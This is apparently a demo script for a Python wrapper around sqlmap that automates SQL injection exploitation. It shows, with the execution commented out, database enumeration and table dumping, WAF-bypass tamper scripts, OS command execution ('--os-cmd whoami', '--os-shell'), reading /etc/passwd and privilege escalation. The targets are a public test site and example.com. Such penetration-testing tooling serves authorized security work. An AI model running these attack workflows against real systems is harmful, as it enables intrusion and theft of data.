#!/usr/bin/env python3
"""
SQLMap Integration Demo

This script demonstrates how to use the SQLMap integration module
to automate SQL injection exploitation through Python.
"""

import sys
import os
import logging

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sql_attacker.sqlmap_integration import (
    SQLMapAttacker,
    SQLMapConfig,
    SQLMapRiskLevel,
    SQLMapLevel,
    HTTPRequest,
    EnumerationTarget,
    create_attacker,
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


def demo_basic_usage():
    """Demonstrate basic SQL injection testing"""
    print("\n" + "="*80)
    print("DEMO 1: Basic SQL Injection Testing")
    print("="*80 + "\n")
    
    # Create a basic attacker instance
    attacker = create_attacker(risk=1, level=1, verbosity=1)
    
    # Create an HTTP request
    request = HTTPRequest(
        url="http://testphp.vulnweb.com/artists.php?artist=1",
        method="GET",
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
    )
    
    # Test for SQL injection
    print(f"Testing URL: {request.url}")
    print("This will use sqlmap to detect SQL injection vulnerabilities...")
    print("Note: sqlmap must be installed and available in PATH for this to work.\n")
    
    # Note: Actual execution commented out to avoid requiring sqlmap
    # result = attacker.test_injection(request)
    # 
    # if result.vulnerable:
    #     print("✓ SQL injection vulnerability found!")
    #     print(f"Output snippet: {result.output[:200]}...")
    # else:
    #     print("✗ No SQL injection vulnerability detected")
    
    print("Example completed (execution commented out - requires sqlmap installation)")


def demo_post_request():
    """Demonstrate POST request testing"""
    print("\n" + "="*80)
    print("DEMO 2: Testing POST Request with Data")
    print("="*80 + "\n")
    
    # Configure attacker with higher risk and level
    config = SQLMapConfig(
        risk=SQLMapRiskLevel.MEDIUM,
        level=SQLMapLevel.INTERMEDIATE,
        verbosity=2,
        threads=2,
        batch=True
    )
    attacker = SQLMapAttacker(config=config)
    
    # Create POST request
    request = HTTPRequest(
        url="http://example.com/login.php",
        method="POST",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0"
        },
        cookies={
            "sessionid": "abc123",
            "tracking": "xyz789"
        },
        data={
            "username": "admin",
            "password": "password123",
            "submit": "Login"
        }
    )
    
    print(f"Testing POST request to: {request.url}")
    print(f"POST data: {request.data}")
    print(f"Cookies: {request.cookies}")
    print("\nThis will test all POST parameters for SQL injection...")
    
    # Note: Actual execution commented out
    # result = attacker.test_injection(request)


def demo_raw_request():
    """Demonstrate using raw HTTP request"""
    print("\n" + "="*80)
    print("DEMO 3: Using Raw HTTP Request")
    print("="*80 + "\n")
    
    attacker = create_attacker()
    
    # Raw HTTP request (e.g., from Burp Suite or proxy)
    raw_request = """POST /login.php HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Cookie: sessionid=abc123; tracking=xyz789
Content-Length: 45

username=admin&password=password123&submit=Login"""
    
    request = HTTPRequest(
        url="http://example.com/login.php",
        raw_request=raw_request
    )
    
    print("Using raw HTTP request:")
    print("-" * 40)
    print(raw_request[:200] + "...")
    print("-" * 40)
    print("\nThis allows you to copy-paste requests directly from Burp Suite or other tools")


def demo_database_enumeration():
    """Demonstrate database enumeration workflow"""
    print("\n" + "="*80)
    print("DEMO 4: Database Enumeration Workflow")
    print("="*80 + "\n")
    
    attacker = create_attacker(risk=2, level=2, verbosity=1)
    
    request = HTTPRequest(
        url="http://testphp.vulnweb.com/artists.php?artist=1",
        method="GET"
    )
    
    print("Step-by-step enumeration:")
    print("-" * 40)
    
    # Step 1: Test vulnerability
    print("\n1. Testing for SQL injection...")
    # result = attacker.test_injection(request)
    
    # Step 2: Enumerate databases
    print("\n2. Enumerating databases...")
    # db_result = attacker.enumerate_databases(request)
    # print(f"   Found databases: {db_result.databases}")
    
    # Step 3: Enumerate tables
    print("\n3. Enumerating tables in database 'testdb'...")
    # table_result = attacker.enumerate_tables(request, "testdb")
    # print(f"   Found tables: {table_result.tables}")
    
    # Step 4: Enumerate columns
    print("\n4. Enumerating columns in table 'users'...")
    # col_result = attacker.enumerate_columns(request, "testdb", "users")
    
    # Step 5: Dump data
    print("\n5. Dumping data from 'users' table...")
    # dump_result = attacker.dump_table(request, "testdb", "users")
    
    print("\n(Execution commented out - requires sqlmap installation)")


def demo_orchestrated_attack():
    """Demonstrate high-level orchestrated attack"""
    print("\n" + "="*80)
    print("DEMO 5: Orchestrated Attack (Automated Workflow)")
    print("="*80 + "\n")
    
    # Configure for aggressive testing
    config = SQLMapConfig(
        risk=SQLMapRiskLevel.HIGH,
        level=SQLMapLevel.EXTENSIVE,
        verbosity=2,
        threads=4,
        batch=True,
        random_agent=True
    )
    attacker = SQLMapAttacker(config=config)
    
    request = HTTPRequest(
        url="http://testphp.vulnweb.com/artists.php?artist=1",
        method="GET"
    )
    
    print("Starting automated attack workflow...")
    print("This will automatically:")
    print("  1. Test for SQL injection")
    print("  2. Enumerate databases")
    print("  3. Enumerate tables")
    print("  4. Enumerate columns")
    print("  5. Dump data from interesting tables")
    print()
    
    # Execute orchestrated attack
    # results = attacker.orchestrate_attack(
    #     request,
    #     target_database=None,  # Auto-detect
    #     target_tables=None  # Auto-select interesting tables
    # )
    # 
    # # Display results
    # print("\n" + "="*80)
    # print("ATTACK RESULTS")
    # print("="*80)
    # print(f"Success: {results['success']}")
    # print(f"Stages completed: {results['stages_completed']}")
    # print(f"Databases found: {len(results['databases'])}")
    # print(f"Tables enumerated: {sum(len(tables) for tables in results['tables'].values())}")
    # print(f"Data dumps: {len(results['dumps'])}")
    # 
    # if results['errors']:
    #     print(f"\nErrors encountered: {len(results['errors'])}")
    #     for error in results['errors']:
    #         print(f"  - {error}")
    
    print("\n(Execution commented out - requires sqlmap installation)")


def demo_with_proxy():
    """Demonstrate using a proxy"""
    print("\n" + "="*80)
    print("DEMO 6: Testing with Proxy (Burp Suite)")
    print("="*80 + "\n")
    
    # Configure to use Burp Suite proxy
    config = SQLMapConfig(
        risk=SQLMapRiskLevel.LOW,
        level=SQLMapLevel.BASIC,
        verbosity=1,
        proxy="http://127.0.0.1:8080",  # Burp Suite default
        batch=True
    )
    attacker = SQLMapAttacker(config=config)
    
    request = HTTPRequest(
        url="http://example.com/api/users?id=1",
        method="GET",
        headers={
            "Authorization": "Bearer token123"
        }
    )
    
    print(f"Testing through proxy: {config.proxy}")
    print("This allows you to:")
    print("  - Monitor all sqlmap traffic in Burp Suite")
    print("  - Modify requests/responses on the fly")
    print("  - Integrate with Burp's other tools")
    print()
    
    # result = attacker.test_injection(request)


def demo_custom_options():
    """Demonstrate custom sqlmap options"""
    print("\n" + "="*80)
    print("DEMO 7: Custom SQLMap Options")
    print("="*80 + "\n")
    
    # Use custom options
    config = SQLMapConfig(
        risk=SQLMapRiskLevel.MEDIUM,
        level=SQLMapLevel.INTERMEDIATE,
        verbosity=2,
        technique="BEUST",  # Boolean, Error, Union, Stacked, Time-based
        dbms="MySQL",  # Target specific DBMS
        tamper=["space2comment", "between"],  # WAF bypass scripts
        delay=2,  # 2 second delay between requests
        extra_args=["--no-cast", "--hex"]  # Additional custom arguments
    )
    attacker = SQLMapAttacker(config=config)
    
    request = HTTPRequest(url="http://example.com/page?id=1")
    
    print("Custom configuration:")
    print(f"  - Technique: {config.technique}")
    print(f"  - DBMS: {config.dbms}")
    print(f"  - Tamper scripts: {config.tamper}")
    print(f"  - Delay: {config.delay}s between requests")
    print(f"  - Extra args: {config.extra_args}")
    print()
    
    # Or execute with additional options directly
    extra_options = ["--os-shell", "--sql-shell"]
    print(f"Executing with extra options: {extra_options}")
    # result = attacker.execute_custom_command(request, extra_options)


def demo_advanced_exploitation():
    """Demonstrate advanced exploitation techniques"""
    print("\n" + "="*80)
    print("DEMO 8: Advanced Exploitation Techniques")
    print("="*80 + "\n")
    
    attacker = create_attacker(risk=3, level=4, verbosity=2)
    
    request = HTTPRequest(url="http://example.com/vulnerable?id=1")
    
    print("Advanced techniques you can use:")
    print()
    
    # 1. OS Command execution
    print("1. OS Command Execution:")
    print("   extra_args = ['--os-cmd', 'whoami']")
    # result = attacker.execute_custom_command(request, ["--os-cmd", "whoami"])
    
    # 2. SQL Shell
    print("\n2. Interactive SQL Shell:")
    print("   extra_args = ['--sql-shell']")
    # result = attacker.execute_custom_command(request, ["--sql-shell"])
    
    # 3. File read/write
    print("\n3. File Operations:")
    print("   extra_args = ['--file-read', '/etc/passwd']")
    # result = attacker.execute_custom_command(request, ["--file-read", "/etc/passwd"])
    
    # 4. Privilege escalation
    print("\n4. Privilege Escalation:")
    print("   extra_args = ['--priv-esc']")
    # result = attacker.execute_custom_command(request, ["--priv-esc"])
    
    print("\n(Execution commented out - requires sqlmap installation)")


def demo_result_parsing():
    """Demonstrate result parsing"""
    print("\n" + "="*80)
    print("DEMO 9: Result Parsing and Logging")
    print("="*80 + "\n")
    
    # Configure with output directory
    config = SQLMapConfig(
        output_dir="/tmp/sqlmap_output",
        verbosity=3
    )
    attacker = SQLMapAttacker(config=config)
    
    request = HTTPRequest(url="http://example.com/test?id=1")
    
    print(f"Output directory: {config.output_dir}")
    print("\nAfter execution, you can find:")
    print("  - Session files")
    print("  - Log files")
    print("  - Dumped data (CSV files)")
    print("  - Detailed reports")
    print()
    
    # Example of parsing results
    print("Parsing results from SQLMapResult object:")
    print("  - result.vulnerable (bool)")
    print("  - result.databases (list)")
    print("  - result.tables (dict)")
    print("  - result.columns (dict)")
    print("  - result.dumped_data (dict)")
    print("  - result.output (full stdout)")
    print("  - result.error (stderr if any)")


def demo_integration_with_existing_tools():
    """Demonstrate integration with existing Megido tools"""
    print("\n" + "="*80)
    print("DEMO 10: Integration with Existing Megido Tools")
    print("="*80 + "\n")
    
    print("You can integrate SQLMap with other Megido modules:")
    print()
    
    print("1. Use with SQLInjectionEngine for combined testing:")
    print("   - Use native detection first (fast)")
    print("   - Use sqlmap for deep exploitation")
    print()
    
    print("2. Use with Browser/Proxy for request capture:")
    print("   - Capture requests from browser")
    print("   - Feed them to sqlmap_integration")
    print()
    
    print("3. Use with exploitation frameworks:")
    print("   - Chain sqlmap with privilege escalation")
    print("   - Combine with impact demonstrator")
    print()
    
    print("Example integration:")
    print("""
    from sql_attacker.sqli_engine import SQLInjectionEngine
    from sql_attacker.sqlmap_integration import SQLMapAttacker
    
    # First, use native engine for quick detection
    engine = SQLInjectionEngine()
    vulnerabilities = engine.detect_vulnerabilities(url, params)
    
    # If found, use sqlmap for deep exploitation
    if vulnerabilities:
        attacker = create_attacker(risk=2, level=3)
        request = HTTPRequest(url=url)
        results = attacker.orchestrate_attack(request)
    """)


def main():
    """Run all demos"""
    print("="*80)
    print("SQLMap Integration Module - Usage Examples")
    print("="*80)
    print()
    print("This demo shows how to use the sqlmap_integration module")
    print("to automate SQL injection exploitation through Python.")
    print()
    print("NOTE: These examples have execution commented out.")
    print("      To run them for real, you need:")
    print("      1. sqlmap installed and in PATH")
    print("      2. A vulnerable target to test")
    print("      3. Proper authorization to test")
    print()
    
    demos = [
        ("Basic Usage", demo_basic_usage),
        ("POST Request", demo_post_request),
        ("Raw HTTP Request", demo_raw_request),
        ("Database Enumeration", demo_database_enumeration),
        ("Orchestrated Attack", demo_orchestrated_attack),
        ("Using Proxy", demo_with_proxy),
        ("Custom Options", demo_custom_options),
        ("Advanced Exploitation", demo_advanced_exploitation),
        ("Result Parsing", demo_result_parsing),
        ("Integration", demo_integration_with_existing_tools),
    ]
    
    for title, demo_func in demos:
        try:
            demo_func()
            input("\nPress Enter to continue to next demo...")
        except KeyboardInterrupt:
            print("\n\nDemo interrupted by user")
            break
        except Exception as e:
            logger.error(f"Error in {title}: {e}", exc_info=True)
            input("\nPress Enter to continue...")
    
    print("\n" + "="*80)
    print("All demos completed!")
    print("="*80)
    print("\nFor more information, see the module documentation:")
    print("  sql_attacker/sqlmap_integration.py")
    print()


if __name__ == "__main__":
    main()
